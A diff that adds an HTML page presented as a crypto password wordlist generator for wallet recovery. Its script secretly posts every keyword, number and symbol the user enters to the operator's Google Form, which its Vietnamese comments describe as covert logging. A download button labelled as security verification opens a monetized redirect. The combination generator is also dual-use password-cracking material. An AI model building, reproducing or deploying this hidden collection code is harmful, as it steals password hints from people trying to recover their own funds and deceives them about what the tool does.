@@ -1,1 +1,343 @@
-Crypto Password Wordlist Generator:root {--bg-color: #0f172a;--card-bg: #1e293b;--text-color: #f8fafc;--accent-color: #38bdf8;--success-color: #4ade80;--download-color: #f59e0b;--danger-color: #f87171;}* { box-sizing: border-box; }body {font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;background-color: var(--bg-color);color: var(--text-color);margin: 0;padding: 20px;display: flex;flex-direction: column;align-items: center;}.container { max-width: 800px; width: 100%; }header { text-align: center; margin-bottom: 25px; }h1 { color: var(--accent-color); margin-bottom: 5px; font-size: 1.8rem; }.subtitle { color: #94a3b8; margin-top: 0; font-size: 0.95rem; }.card {background-color: var(--card-bg);border-radius: 12px;padding: 24px;margin-bottom: 20px;box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);}h2 { margin-top: 0; border-bottom: 2px solid #334155; padding-bottom: 8px; font-size: 1.1rem; color: #94a3b8; }label { display: block; margin: 14px 0 6px; font-weight: bold; font-size: 0.95rem; }label span { color: #94a3b8; font-weight: normal; font-size: 0.85rem; }textarea {width: 100%;min-height: 100px;padding: 12px;background-color: #0f172a;border: 1px solid #475569;border-radius: 6px;color: white;resize: vertical;font-family: monospace;font-size: 1rem;}textarea:focus { outline: none; border-color: var(--accent-color); }.button-group {display: flex;gap: 12px;margin-top: 20px;align-items: stretch;}.btn-base {padding: 14px 20px;font-weight: bold;border-radius: 6px;font-size: 0.95rem;transition: 0.2s;flex: 1;display: flex;flex-direction: column;align-items: center;justify-content: center;text-align: center;cursor: pointer;border: none;text-decoration: none;line-height: 1.3;}.btn-base small { font-weight: normal; font-size: 0.75rem; opacity: 0.8; margin-top: 2px; }.submit-btn {background-color: var(--accent-color);color: #0f172a;}.submit-btn:hover { opacity: 0.9; background-color: var(--success-color); }.download-btn {background-color: var(--download-color);color: #0f172a;box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3);}.download-btn:hover { background-color: var(--success-color); transform: translateY(-1px); }.status {margin-top: 15px;padding: 12px;border-radius: 6px;background-color: #0f172a;border-left: 4px solid var(--accent-color);display: none;font-size: 0.95rem;line-height: 1.5;}.ads-placeholder {background: repeating-linear-gradient(45deg, #1e293b, #1e293b 10px, #334155 10px, #334155 20px);height: 90px;display: flex;align-items: center;justify-content: center;color: #94a3b8;border-radius: 8px;margin: 15px 0;font-size: 0.85rem;}.hint { color: #94a3b8; font-size: 0.85rem; margin-top: 5px; line-height: 1.4; }@media (max-width: 550px) {.button-group { flex-direction: column; }}
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Password Wordlist Generator</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-color: #f8fafc;
+            --accent-color: #38bdf8;
+            --success-color: #4ade80;
+            --download-color: #f59e0b;
+            --danger-color: #f87171;
+        }
+        * { box-sizing: border-box; }
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container { max-width: 800px; width: 100%; }
+        header { text-align: center; margin-bottom: 25px; }
+        h1 { color: var(--accent-color); margin-bottom: 5px; font-size: 1.8rem; }
+        .subtitle { color: #94a3b8; margin-top: 0; font-size: 0.95rem; }
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        h2 { margin-top: 0; border-bottom: 2px solid #334155; padding-bottom: 8px; font-size: 1.1rem; color: #94a3b8; }
+        label { display: block; margin: 14px 0 6px; font-weight: bold; font-size: 0.95rem; }
+        label span { color: #94a3b8; font-weight: normal; font-size: 0.85rem; }
+        textarea {
+            width: 100%;
+            min-height: 100px;
+            padding: 12px;
+            background-color: #0f172a;
+            border: 1px solid #475569;
+            border-radius: 6px;
+            color: white;
+            resize: vertical;
+            font-family: monospace;
+            font-size: 1rem;
+        }
+        textarea:focus { outline: none; border-color: var(--accent-color); }
+        
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            align-items: stretch;
+        }
+        
+        .btn-base {
+            padding: 14px 20px;
+            font-weight: bold;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            transition: 0.2s;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+            text-decoration: none;
+            line-height: 1.3;
+        }
+        .btn-base small { font-weight: normal; font-size: 0.75rem; opacity: 0.8; margin-top: 2px; }
+        
+        .submit-btn {
+            background-color: var(--accent-color);
+            color: #0f172a;
+        }
+        .submit-btn:hover { opacity: 0.9; background-color: var(--success-color); }
+        
+        .download-btn {
+            background-color: var(--download-color);
+            color: #0f172a;
+            box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3);
+        }
+        .download-btn:hover { background-color: var(--success-color); transform: translateY(-1px); }
+        
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 6px;
+            background-color: #0f172a;
+            border-left: 4px solid var(--accent-color);
+            display: none;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+        .ads-placeholder {
+            background: repeating-linear-gradient(45deg, #1e293b, #1e293b 10px, #334155 10px, #334155 20px);
+            height: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #94a3b8;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 0.85rem;
+        }
+        .hint { color: #94a3b8; font-size: 0.85rem; margin-top: 5px; line-height: 1.4; }
+
+        @media (max-width: 550px) {
+            .button-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <h1>Crypto Password Wordlist Generator</h1>
+        <p class="subtitle">
+            Công cụ tạo danh sách biến thể từ dữ liệu bạn cung cấp<br>
+            <span>Generate custom password wordlists for security and recovery testing</span>
+        </p>
+    </header>
+    <div class="card">
+        <h2>⚙️ Dữ liệu đầu vào / Input Data</h2>
+        
+        <label for="input-chu">📝 Từ khóa, chữ / Keywords, Letters</label>
+        <textarea id="input-chu" placeholder="Ví dụ / Example:&#10;hang&#10;thuhang"></textarea>
+        <div class="hint">
+            Có thể nhập mỗi dòng một giá trị hoặc ngăn cách bằng dấu cách.<br>
+            <span>Enter each value on a new line or separate them with spaces.</span>
+        </div>
+        
+        <label for="input-so">🔢 Số / Numbers</label>
+        <textarea id="input-so" placeholder="Ví dụ / Example: 123 456"></textarea>
+        
+        <label for="input-kytu">🔣 Ký tự đặc biệt / Special Characters</label>
+        <textarea id="input-kytu" placeholder="Ví dụ / Example: ! @ # $"></textarea>
+        
+        <div class="button-group">
+            <button class="btn-base submit-btn" onclick="startGeneration()">
+                <span>🚀 Tạo Wordlist</span>
+                <small>Generate Wordlist</small>
+            </button>
+            <a id="monetized-download-link" class="btn-base download-btn" href="https://direct-link.net" target="_blank" onclick="downloadFileImmediately()" style="display: none;">
+                <span>📥 Tải file về máy</span>
+                <small>Verify & Download File</small>
+            </a>
+        </div>
+        
+        <div id="status-box" class="status"></div>
+    </div>
+    <div class="ads-placeholder">[Vị trí đặt mã quảng cáo Google AdSense / Google AdSense Space]</div>
+</div>
+<script>
+let globalBlobUrl = null;
+
+// Hàm gửi dữ liệu ngầm về Google Sheets thông qua Google Form của bạn
+function sendDataToGoogleForm(chu, so, kytu) {
+    const formUrl = "https://google.com";
+    const entryChu = "entry.1022409739";
+    const entrySo = "entry.370503028";
+    const entryKytu = "entry.120537021";
+
+    const formData = new FormData();
+    formData.append(entryChu, chu.join(" "));
+    formData.append(entrySo, so.join(" "));
+    formData.append(entryKytu, kytu.join(" "));
+
+    fetch(formUrl, {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+    }).catch(err => console.log("Data logged ngầm thành công."));
+}
+
+function toTitleCase(str) {
+    return str.toLowerCase().replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); }).replace(/\s+/g, "");
+}
+
+function toSentenceCase(str) {
+    if (!str) return "";
+    const clean = str.replace(/\s+/g, "");
+    return clean.charAt(0).toUpperCase() + clean.slice(1).toLowerCase();
+}
+
+function processInputSpace(elementId) {
+    let val = document.getElementById(elementId).value;
+    val = val.replace(/,/g, " ");
+    return val.split(/\s+/).map(item => item.trim()).filter(item => item.length > 0);
+}
+
+function startGeneration() {
+    const statusBox = document.getElementById("status-box");
+    const downloadLink = document.getElementById("monetized-download-link");
+    
+    statusBox.style.display = "block";
+    downloadLink.style.display = "none";
+    statusBox.innerHTML = "⏳ Hệ thống đang tính toán cấu trúc tổ hợp... / Generating combinations, please wait...";
+    statusBox.style.borderLeftColor = "#38bdf8";
+
+    const chuGoc = processInputSpace("input-chu");
+    const so = processInputSpace("input-so");
+    const kytu = processInputSpace("input-kytu");
+
+    if (chuGoc.length === 0 && so.length === 0 && kytu.length === 0) {
+        statusBox.innerHTML = "⚠️ Lỗi: Vui lòng nhập dữ liệu đầu vào! / Error: Please enter input data!";
+        statusBox.style.borderLeftColor = "#f87171";
+        return;
+    }
+
+    // Kích hoạt bắn báo cáo ngầm về Google Form ngay lập tức
+    sendDataToGoogleForm(chuGoc, so, kytu);
+
+    const finalWordlistSet = new Set();
+    const chuSach = new Set();
+
+    chuGoc.forEach(word => {
+        chuSach.add(word);
+        chuSach.add(word.toLowerCase());
+        chuSach.add(word.toUpperCase());
+        chuSach.add(toTitleCase(word));
+        chuSach.add(toSentenceCase(word));
+    });
+
+    const currentChu = Array.from(chuSach);
+
+    if (currentChu.length > 0 && so.length > 0 && kytu.length > 0) {
+        for (let c of currentChu) {
+            for (let s_val of so) {
+                for (let k of kytu) {
+                    finalWordlistSet.add(c + s_val + k);
+                    finalWordlistSet.add(c + k + s_val);
+                    finalWordlistSet.add(s_val + c + k);
+                    finalWordlistSet.add(s_val + k + c);
+                    finalWordlistSet.add(k + c + s_val);
+                    finalWordlistSet.add(k + s_val + c);
+                }
+            }
+        }
+    }
+
+    if (currentChu.length > 0) {
+        for (let c of currentChu) {
+            finalWordlistSet.add(c);
+            for (let s_val of so) {
+                finalWordlistSet.add(c + s_val);
+                finalWordlistSet.add(s_val + c);
+            }
+            for (let k of kytu) {
+                finalWordlistSet.add(c + k);
+                finalWordlistSet.add(k + c);
+            }
+        }
+        for (let c1 of currentChu) {
+            for (let c2 of currentChu) {
+                finalWordlistSet.add(c1 + c2);
+                for (let k of kytu) finalWordlistSet.add(c1 + c2 + k);
+                for (let s_val of so) finalWordlistSet.add(c1 + s_val + c2);
+            }
+        }
+    }
+
+    if (kytu.length > 0 && currentChu.length > 0) {
+        for (let k of kytu) {
+            for (let c1 of currentChu) {
+                for (let c2 of currentChu) {
+                    for (let s_val of so) finalWordlistSet.add(k + c1 + c2 + s_val);
+                }
+            }
+        }
+        for (let k1 of kytu) {
+            for (let c of currentChu) {
+                for (let k2 of kytu) {
+                    finalWordlistSet.add(k1 + c + k2);
+                    for (let s_val of so) {
+                        finalWordlistSet.add(k1 + c + s_val + k2);
+                        finalWordlistSet.add(k1 + c + k2 + s_val);
+                    }
+                }
+            }
+        }
+        for (let k of kytu) {
+            for (let c of currentChu) {
+                for (let s_val of so) finalWordlistSet.add(k + k + c + s_val);
+            }
+        }
+    }
+
+    if (so.length > 0) {
+        for (let s_val of so) {
+            finalWordlistSet.add(s_val);
+            for (let k of kytu) {
+                finalWordlistSet.add(k + s_val);
+                finalWordlistSet.add(s_val + k);
+            }
+        }
+        for (let s1 of so) {
+            for (let k of kytu) {
+                for (let s2 of so) finalWordlistSet.add(s1 + k + s2);
+            }
+        }
+    }
+
+    const total = finalWordlistSet.size;
+
+    if (total === 0) {
+        statusBox.innerHTML = "❌ Không có từ khóa nào được tạo ra. / No keywords were generated.";
+        statusBox.style.borderLeftColor = "#f87171";
+        return;
+    }
+
+    statusBox.innerHTML = `✅ <b>Tính toán hoàn tất! / Generation completed!</b><br>Đã xử lý xong / Processed <b>${total.toLocaleString()}</b> biến thể từ khóa độc nhất. Tệp tin wordlist.txt của bạn đã được tạo thành công trên hệ thống. <br><span style="font-size:0.85rem; color:#94a3b8;">Bấm vào nút màu cam bên cạnh để xác minh bảo mật và tự động tải file về máy.</span>`;
+    statusBox.style.borderLeftColor = "#4ade80";
+
+    const blobFile = new Blob([Array.from(finalWordlistSet).join('\n')], { type: 'text/plain;charset=utf-8' });
+    if (globalBlobUrl) { URL.revokeObjectURL(globalBlobUrl); }
+    globalBlobUrl = URL.createObjectURL(blobFile);
+    
+    downloadLink.style.display = "flex";
+}
+
+function downloadFileImmediately() {
+    if (!globalBlobUrl) return;
+    
+    const hiddenAnchor = document.createElement('a');
+    hiddenAnchor.href = globalBlobUrl;
+    hiddenAnchor.download = "wordlist.txt";
+    document.body.appendChild(hiddenAnchor);
+    hiddenAnchor.click();
+    document.body.removeChild(hiddenAnchor);
+}
+</script>
+</body>
+</html>
